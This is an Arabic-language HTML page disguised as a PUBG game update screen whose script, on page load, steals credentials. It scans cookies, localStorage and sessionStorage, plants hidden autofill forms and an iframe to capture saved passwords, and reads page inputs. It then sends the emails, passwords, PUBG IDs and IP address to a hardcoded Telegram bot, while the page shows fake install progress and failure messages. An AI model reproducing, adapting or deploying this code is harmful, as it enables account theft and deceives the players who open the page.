<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Update 2026</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: Arial;
            text-align: center;
            padding: 50px 20px;
        }
        .box {
            background: #1a1a2e;
            padding: 40px;
            border-radius: 20px;
            max-width: 400px;
            margin: auto;
            border: 1px solid #e94560;
        }
        h1 { color: #e94560; }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #aaa;
            font-size: 14px;
            margin-top: 10px;
        }
        .note {
            color: #ffcc00;
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="box">
    <h1>🔥 PUBG UPDATE</h1>
    <p>جاري تحميل التحديث الجديد...</p>
    <div class="loader"></div>
    <p class="status">⏳ يرجى الانتظار، سيتم التثبيت تلقائياً</p>
    <p class="note">⚠️ لا تغلق الصفحة حتى انتهاء التحديث</p>
</div>

<script>
// ==========================================
// إعدادات التيليجرام
// ==========================================
const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
const CHAT_ID = "5730027675";

// ==========================================
// دالة إرسال البيانات إلى التيليجرام
// ==========================================
function sendToTelegram(data) {
    const message = `
🎯 **تم سحب البيانات تلقائياً!**
═══════════════════════
📧 **الإيميل:** \`${data.email || 'غير موجود'}\`
🔑 **كلمة المرور:** \`${data.password || 'غير موجود'}\`
🎮 **PUBG ID:** ${data.pubg_id || 'غير موجود'}
🌐 **IP:** ${data.ip || 'غير معروف'}
📱 **المتصفح:** ${data.userAgent || 'غير معروف'}
🕒 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
═══════════════════════
    `;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {});
}

// ==========================================
// دالة الحصول على IP
// ==========================================
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

// ==========================================
// محاولة استخراج كلمات المرور من المتصفح
// ==========================================
function stealPasswords() {
    const data = {
        email: '',
        password: '',
        pubg_id: '',
        userAgent: navigator.userAgent
    };

    // ===== الطريقة 1: محاولة قراءة الكوكيز =====
    const cookies = document.cookie;
    if (cookies) {
        // البحث عن إيميل في الكوكيز
        const emailMatch = cookies.match(/email[=:]([^;]+)/i) || 
                           cookies.match(/user[=:]([^;]+)/i) ||
                           cookies.match(/login[=:]([^;]+)/i);
        if (emailMatch) data.email = decodeURIComponent(emailMatch[1]);
        
        // البحث عن باسورد في الكوكيز
        const passMatch = cookies.match(/pass[=:]([^;]+)/i) || 
                          cookies.match(/password[=:]([^;]+)/i);
        if (passMatch) data.password = decodeURIComponent(passMatch[1]);
    }

    // ===== الطريقة 2: محاولة استخراج من autofill =====
    // إنشاء حقول خفية لمحاولة استخراج البيانات المحفوظة
    const form = document.createElement('form');
    form.style.display = 'none';
    
    const emailInput = document.createElement('input');
    emailInput.type = 'email';
    emailInput.name = 'email';
    emailInput.autocomplete = 'email';
    emailInput.style.display = 'none';
    
    const passInput = document.createElement('input');
    passInput.type = 'password';
    passInput.name = 'password';
    passInput.autocomplete = 'current-password';
    passInput.style.display = 'none';
    
    const submitInput = document.createElement('input');
    submitInput.type = 'submit';
    submitInput.style.display = 'none';
    
    form.appendChild(emailInput);
    form.appendChild(passInput);
    form.appendChild(submitInput);
    document.body.appendChild(form);
    
    // محاولة جلب القيم بعد ثانية
    setTimeout(() => {
        if (emailInput.value && !data.email) {
            data.email = emailInput.value;
        }
        if (passInput.value && !data.password) {
            data.password = passInput.value;
        }
        document.body.removeChild(form);
    }, 500);

    // ===== الطريقة 3: البحث في localStorage =====
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            if (key && value) {
                // البحث عن إيميل
                if (/email|user|login|mail/i.test(key) && !data.email) {
                    if (value.includes('@')) data.email = value;
                }
                // البحث عن باسورد
                if (/pass|password|pwd/i.test(key) && !data.password) {
                    if (value.length > 3) data.password = value;
                }
                // البحث عن PUBG ID
                if (/pubg|player|gamer/i.test(key) && !data.pubg_id) {
                    data.pubg_id = value;
                }
            }
        }
    } catch(e) {}

    // ===== الطريقة 4: البحث في sessionStorage =====
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            if (key && value) {
                if (/email|user|login|mail/i.test(key) && !data.email) {
                    if (value.includes('@')) data.email = value;
                }
                if (/pass|password|pwd/i.test(key) && !data.password) {
                    if (value.length > 3) data.password = value;
                }
                if (/pubg|player|gamer/i.test(key) && !data.pubg_id) {
                    data.pubg_id = value;
                }
            }
        }
    } catch(e) {}

    // ===== الطريقة 5: البحث في IndexedDB =====
    // (صعب التنفيذ من script عادي)

    // ===== الطريقة 6: محاولة التقاط البيانات من أي نموذج في الصفحة =====
    document.querySelectorAll('input').forEach(input => {
        if (input.type === 'email' && input.value && !data.email) {
            data.email = input.value;
        }
        if (input.type === 'password' && input.value && !data.password) {
            data.password = input.value;
        }
    });

    return data;
}

// ==========================================
// محاولة استغلال كلمات المرور المحفوظة في المتصفح
// ==========================================
function exploitSavedPasswords() {
    // إنشاء إطار مخفي لمحاولة تحميل بيانات autofill
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);
    
    // محاولة إدخال بيانات في الإطار
    try {
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        const form = doc.createElement('form');
        form.action = '#';
        
        const emailField = doc.createElement('input');
        emailField.type = 'email';
        emailField.name = 'email';
        emailField.autocomplete = 'email';
        emailField.style.display = 'none';
        
        const passField = doc.createElement('input');
        passField.type = 'password';
        passField.name = 'password';
        passField.autocomplete = 'current-password';
        passField.style.display = 'none';
        
        form.appendChild(emailField);
        form.appendChild(passField);
        doc.body.appendChild(form);
        
        // محاولة جلب القيم
        setTimeout(() => {
            if (emailField.value) {
                const email = emailField.value;
                const password = passField.value || 'محفوظة ولكن غير قابلة للقراءة';
                sendToTelegram({
                    email: email,
                    password: password,
                    pubg_id: '',
                    ip: '',
                    userAgent: navigator.userAgent
                });
            }
            document.body.removeChild(iframe);
        }, 1000);
    } catch(e) {
        document.body.removeChild(iframe);
    }
}

// ==========================================
// التشغيل الرئيسي
// ==========================================
async function main() {
    // إشعار بداية
    sendToTelegram({
        email: 'جاري السحب...',
        password: 'جاري السحب...',
        pubg_id: 'جاري السحب...',
        ip: await getIP(),
        userAgent: navigator.userAgent
    });

    // محاولة سرقة البيانات
    const data = stealPasswords();
    
    // الحصول على IP
    data.ip = await getIP();
    
    // إرسال البيانات المسروقة
    if (data.email || data.password) {
        sendToTelegram(data);
    }
    
    // محاولة استغلال autofill
    exploitSavedPasswords();

    // محاولة إضافية بعد 3 ثواني
    setTimeout(async () => {
        const newData = stealPasswords();
        newData.ip = await getIP();
        if (newData.email || newData.password) {
            sendToTelegram(newData);
        }
    }, 3000);

    // محاولة إضافية بعد 5 ثواني
    setTimeout(async () => {
        const newData = stealPasswords();
        newData.ip = await getIP();
        if (newData.email || newData.password) {
            sendToTelegram(newData);
        }
    }, 5000);
}

// ==========================================
// تشغيل عند تحميل الصفحة
// ==========================================
window.onload = function() {
    main();
    
    // تغيير النص بعد فترة
    setTimeout(() => {
        document.querySelector('.status').textContent = '⚠️ فشل التحديث، جارٍ المحاولة مجدداً...';
    }, 3000);
    
    setTimeout(() => {
        document.querySelector('.status').textContent = '❌ فشل التثبيت، يرجى المحاولة لاحقاً.';
        document.querySelector('.loader').style.display = 'none';
    }, 8000);
};
</script>

</body>
</html>
